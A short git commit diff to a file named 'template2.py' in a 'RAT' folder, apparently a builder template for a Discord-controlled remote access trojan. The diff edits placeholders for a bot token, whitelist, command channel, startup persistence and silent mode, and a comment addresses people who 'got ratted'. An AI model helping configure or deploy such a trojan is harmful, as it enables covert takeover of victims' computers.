d113a3e10effa0e129135acf76c51a7abbacf9f3
vn4thyt <vns.on.ytbe@gmail.com>
2025-12-24 16:23:27 +0000

    Update template2.py

--- Stuff/RAT/template2.py
+++ Stuff/RAT/template2.py
@@ -4,10 +4,10 @@
 
 # If you got ratted, and reversed engineered the file back here - Please note I take NO accountability for what others do with my projects. If you would like to know how to remove the rat and stay safe, please DM 'vn4th' on Discord.
 
-TOKEN = f"{token}"
+TOKEN = {token}
 WHITELIST = [{whitelist}]
 main_channel = {main_channel}
-prefix = f"{prefix}"
+prefix = {prefix}
 add_to_startup = {add_to_startup}
 silent_mode = {silent_mode}
 
